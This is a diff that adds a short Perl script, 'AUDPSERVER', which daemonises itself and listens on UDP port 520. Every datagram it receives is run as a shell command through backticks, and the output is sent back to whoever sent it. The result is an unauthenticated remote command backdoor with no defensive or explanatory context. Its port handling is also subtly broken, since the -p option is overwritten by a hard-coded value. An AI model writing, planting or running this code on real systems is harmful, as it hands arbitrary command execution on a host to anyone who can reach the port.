@@ -1,0 +1,48 @@
+#!/usr/bin/perl
+
+use IO::Socket;
+use POSIX;
+use Getopt::Std;
+
+
+getopts('p:', \%opt)||die("Error: Unable to get command line options !!!\n");
+if(defined($opt{'p'})) { $port=$opt{'p'} } else { \&usage() }
+
+$pid=fork;
+exit if $pid;
+die("Error.") unless defined($pid);
+
+POSIX::setsid();
+$time_to_die=0;
+
+sub signal_handler {
+ $time_to_die=1;
+}
+
+$SIG{INT}=$SIG{TERM}=$SIG{HUP}=\&signal_handler;
+
+until($time_to_die) {
+$|=1;
+
+$port=520;
+$maxlen=1024;
+
+my($sock, $raddr, $rhost);
+
+$sock=IO::Socket::INET->new(LocalPort=>$port,Proto=>'udp') or die("Error.\n");
+
+while($sock->recv($msg, $maxlen)) {
+ my($rport, $ipaddr)=sockaddr_in($sock->peername);
+ $rhost=gethostbyaddr($ipaddr, AF_INET);
+  $output=`$msg`;
+  $sock->send($output);
+  $sock->send("-end.");
+}
+}
+
+sub usage() {
+   print("\nAUDPSERVER - Programmed by Anarchy\n");
+   print("==================================\n");
+   print("Usage: AUDPSERVER -p <port>\n\n");
+   exit 1;
+}   
